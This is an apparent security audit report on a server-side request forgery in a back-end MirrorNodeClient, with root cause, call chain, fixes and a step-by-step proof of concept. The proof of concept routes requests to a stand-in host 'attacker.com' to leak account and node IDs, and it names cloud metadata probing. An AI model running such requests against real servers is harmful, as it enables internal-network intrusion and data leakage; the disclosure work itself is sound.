Audit Report

## Title
Server-Side Request Forgery (SSRF) via User-Controlled `mirrorNetwork` in Back-End `MirrorNodeClient`

## Summary
The back-end `MirrorNodeClient` constructs outbound HTTP request URLs from a user-supplied `mirrorNetwork` string stored in transaction records. When the value does not match a known network identifier, `MirrorNodeREST.fromBaseURL` blindly prepends `https://` to the raw input with no allowlist or format validation. An authenticated user can submit a transaction with an attacker-controlled `mirrorNetwork` value, causing the server to issue HTTP requests to arbitrary internal or external hosts.

## Finding Description

**Root cause — unvalidated URL construction:**

`MirrorNodeREST.fromBaseURL` in `back-end/libs/common/src/utils/mirrorNode/index.ts` has a `default` branch that constructs a URL directly from the caller-supplied string with no allowlist or format validation:

```ts
default:
    return `https://${mirrorNetwork}`;
``` [1](#0-0) 

**Sink — server-side HTTP request:**

`MirrorNodeClient.getMirrorNodeRESTURL` (line 181) calls `MirrorNodeREST.fromBaseURL(mirrorNetwork)` and the result is used directly as the base URL for outbound HTTP requests via `this.httpService.axiosRef.get<T>(url, ...)`: [2](#0-1) [3](#0-2) 

The constructed URLs include account IDs and node IDs appended to the attacker-controlled base: [4](#0-3) [5](#0-4) 

**Source — user-controlled `mirrorNetwork` in transaction payload:**

The front-end `submitTransaction` function posts `mirrorNetwork: network` directly from the user-configurable network store to the back-end: [6](#0-5) 

**Call chain from stored value to HTTP request:**

`NodeCacheService.getNodeInfoForTransaction` reads `transaction.mirrorNetwork` directly from the stored transaction record and passes it to `mirrorNodeClient.fetchNodeInfo` without any re-validation: [7](#0-6) [8](#0-7) 

## Impact Explanation

- **SSRF to internal network:** The server can be made to probe internal hosts unreachable from the public internet (e.g., `169.254.169.254` for cloud metadata endpoints, internal databases, Redis, RabbitMQ).
- **Data exfiltration via request path:** Account IDs and node IDs are appended to the attacker-controlled URL (e.g., `GET https://attacker.com/api/v1/accounts/{accountId}`), leaking identifiers to the attacker's server in the HTTP request path.
- **Firewall bypass:** Requests originate from the trusted back-end server IP, bypassing network-level controls that block direct attacker access to internal services.
- **Retry amplification:** The `fetchWithRetry` logic retries up to 3 times with exponential backoff, meaning each trigger causes multiple outbound requests to the attacker-controlled host. [9](#0-8) 

## Likelihood Explanation

Any authenticated organization user can trigger this without any privileged role. The attack requires only the ability to submit a transaction — a core, normal product workflow. The front-end UI natively supports setting custom mirror node URLs via `NetworkSettings.vue`, and the `mirrorNetwork` field is a standard part of the transaction creation request body. No special tooling or exploitation technique is required beyond crafting a transaction with a custom `mirrorNetwork` value.

## Recommendation

1. **Allowlist validation on ingestion:** In the back-end DTO/validation layer for transaction creation, validate that `mirrorNetwork` is one of the known enum values (`mainnet`, `testnet`, `previewnet`, `localnode`) or matches a strict URL allowlist pattern before persisting it.
2. **Harden `MirrorNodeREST.fromBaseURL`:** Remove or restrict the `default` branch. If custom URLs must be supported, validate against a strict allowlist of approved hostnames/patterns before constructing the URL.
3. **Re-validate on use:** Even if the value is stored, re-validate `mirrorNetwork` against the allowlist in `getMirrorNodeRESTURL` before constructing the outbound URL, so that any previously stored malicious values cannot be used.

## Proof of Concept

1. Attacker (authenticated organization user) sets a custom mirror node URL to `attacker.com` in the front-end network settings (`NetworkSettings.vue`).
2. Attacker submits a transaction; the POST body includes `mirrorNetwork: "attacker.com"`.
3. The back-end stores `mirrorNetwork = "attacker.com"` in the `Transaction` database record.
4. When `NodeCacheService.getNodeInfoForTransaction` processes the transaction, it reads `transaction.mirrorNetwork` (`"attacker.com"`) and calls `this.mirrorNodeClient.fetchNodeInfo(nodeId, "attacker.com", etag)`.
5. `fetchNodeInfo` calls `getMirrorNodeRESTURL("attacker.com")` → `MirrorNodeREST.fromBaseURL("attacker.com")` → `"https://attacker.com"`.
6. The server issues `GET https://attacker.com/api/v1/network/nodes?node.id=eq:{nodeId}` — an outbound HTTP request from the back-end server to the attacker-controlled host, with the node ID leaked in the path.
7. For account lookups, the server issues `GET https://attacker.com/api/v1/accounts/{accountId}`, leaking account IDs.
8. The retry logic causes up to 3 such requests per trigger.

  private async fetchWithRetry<T>(
    url: string,
    etag?: string,
    attempt = 1,
  ): Promise<HttpResult<T>> {
    try {
      return await this.getMirrorNodeData<T>(url, etag);
    } catch (error) {
      const shouldRetry = this.isRetryableError(error);

      if (!shouldRetry || attempt >= RETRY_CONFIG.MAX_RETRIES) {
        this.logger.error(
          `Request failed after ${attempt} attempt(s) for ${url}: ${error.message}`
        );
        throw new HttpException(
          `Mirror node request failed: ${error.message}`,
          error.response?.status || HttpStatus.SERVICE_UNAVAILABLE,
        );
      }

      const delay = this.calculateBackoffDelay(attempt);
      this.logger.warn(
        `Request failed (attempt ${attempt}/${RETRY_CONFIG.MAX_RETRIES}), ` +
        `retrying in ${delay}ms: ${error.message}`
      );

      await this.delay(delay);
      return this.fetchWithRetry<T>(url, etag, attempt + 1);
    }
